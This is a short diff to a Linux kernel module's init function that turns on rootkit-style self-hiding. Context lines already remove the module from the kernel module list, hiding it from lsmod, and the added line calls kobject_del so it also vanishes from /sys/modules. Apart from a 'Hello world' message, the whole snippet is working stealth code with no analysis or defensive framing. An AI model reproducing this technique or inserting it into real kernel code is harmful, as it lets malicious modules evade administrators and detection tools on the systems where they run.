@@ -10,7 +10,7 @@ static int lkm_init(void)
     list_del_init(&__this_module.list);
 
     //Hide this module from /sys/modules
-    //kobject_del(&__this_module.mkobj.kobj);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
     printk("Hello world, module loaded\n");
     return 0;    
 }
